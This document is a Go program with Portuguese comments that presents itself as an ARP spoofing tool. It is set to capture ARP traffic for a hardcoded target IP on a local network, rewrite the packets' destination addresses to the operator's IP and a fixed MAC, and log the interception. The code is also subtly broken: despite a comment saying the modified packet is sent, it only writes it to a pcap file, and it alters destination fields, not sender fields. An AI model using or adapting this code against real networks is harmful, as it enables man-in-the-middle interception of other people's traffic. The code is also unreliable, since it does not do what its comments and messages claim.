package main

import (
	"bytes"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"syscall"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket/pcapgo"
)

const (
	TargetIP   = "10.102.0.140"  // IP que você deseja interceptar
	YourIP     = "10.102.3.0"    // Seu IP na rede
	Interface  = "Ethernet"      // Interface de rede que você deseja usar
	OutputFile = "captured.pcap" // Nome do arquivo .pcap para salvar os pacotes capturados
)

func main() {
	handle, err := pcap.OpenLive(Interface, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatalf("Falha ao abrir a interface: %v", err)
	}
	defer handle.Close()

	filter := fmt.Sprintf("arp and dst host %s", TargetIP)
	err = handle.SetBPFFilter(filter)
	if err != nil {
		log.Fatalf("Falha ao configurar o filtro BPF: %v", err)
	}
	outputFile, err := os.Create(OutputFile)
	if err != nil {
		log.Fatalf("Falha ao criar o arquivo de saída: %v", err)
	}
	defer outputFile.Close()

	w := pcapgo.NewWriter(outputFile)
	w.WriteFileHeader(65536, layers.LinkTypeEthernet)

	// Captura os sinais de interrupção para finalizar o programa corretamente
	signalCh := make(chan os.Signal, 1)
	signal.Notify(signalCh, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalCh
		fmt.Println("Encerrando o programa...")
		handle.Close()
		os.Exit(0)
	}()

	fmt.Println("ARP spoofing iniciado. Aguardando pacotes...")

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		// Verifica se o pacote é ARP
		arpLayer := packet.Layer(layers.LayerTypeARP)
		if arpLayer != nil {
			arpPacket, _ := arpLayer.(*layers.ARP)
			if bytes.Equal(arpPacket.DstProtAddress, net.ParseIP(TargetIP).To4()) {
				copy(arpPacket.DstProtAddress, net.ParseIP(YourIP).To4())
				copy(arpPacket.DstHwAddress, net.HardwareAddr{0xE4, 0xE7, 0x49, 0x12, 0x52, 0x17})

				// Envia o pacote ARP modificado
				buf := gopacket.NewSerializeBuffer()
				opts := gopacket.SerializeOptions{}
				err := gopacket.SerializeLayers(buf, opts, arpPacket)
				if err != nil {
					log.Printf("Falha ao serializar o pacote: %v", err)
					continue
				}

				err = w.WritePacket(packet.Metadata().CaptureInfo, buf.Bytes())
				if err != nil {
					log.Printf("Falha ao salvar o pacote capturado: %v", err)
					continue
				}

				fmt.Println("ARP spoofing aplicado para o IP:", TargetIP)
			}
		}
	}
}
